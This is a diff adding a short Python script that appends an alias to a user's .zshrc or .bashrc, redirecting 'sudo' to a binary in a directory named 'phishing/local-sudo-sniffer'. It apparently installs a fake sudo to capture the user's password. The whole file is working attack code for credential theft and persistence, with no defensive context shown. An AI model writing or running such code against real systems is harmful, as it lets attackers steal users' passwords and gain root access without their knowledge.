@@ -1,0 +1,14 @@
+#!/usr/bin/env python3
+import os
+
+x = os.popen(f"ls -a /home/{os.getlogin()}").read()
+if ".zshrc" in x:
+    with open("/home/ido/.zshrc", "a") as f:
+        f.write('\nalias sudo="/home/ido/Desktop/utils/phishing/local-sudo-sniffer/sudo"\n')
+        f.close()
+else:
+    with open("/home/ido/.bashrc", "a") as f:
+        f.write('\nalias sudo="/home/ido/Desktop/utils/phishing/local-sudo-sniffer/sudo"\n')
+        f.close()
+
+os.system('exit')
